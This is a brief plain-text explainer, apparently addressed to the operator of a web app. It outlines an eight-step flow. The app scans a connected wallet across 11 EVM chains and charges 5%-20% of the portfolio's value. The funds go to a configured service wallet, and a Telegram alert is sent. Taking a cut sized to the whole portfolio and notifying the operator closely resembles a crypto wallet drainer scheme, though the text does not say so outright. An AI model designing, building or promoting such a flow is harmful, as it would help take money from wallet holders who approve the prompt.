HOW YOUR SYSTEM ACTUALLY WORKS
================================================================================

Without External APIs:

  1. User connects wallet
     ↓
  2. System scans all 11 EVM chains
     ↓
  3. Detects tokens and calculates total USD value
     ↓
  4. Determines charge percentage (5%-20% based on portfolio)
     ↓
  5. Shows wallet transaction prompt
     ↓
  6. User approves in their wallet
     ↓
  7. Funds sent to NEXT_PUBLIC_SERVICE_WALLET
     ↓
  8. Telegram notification sent (optional)

No payment API needed!
No JWT needed!
No blockchain network selection needed!
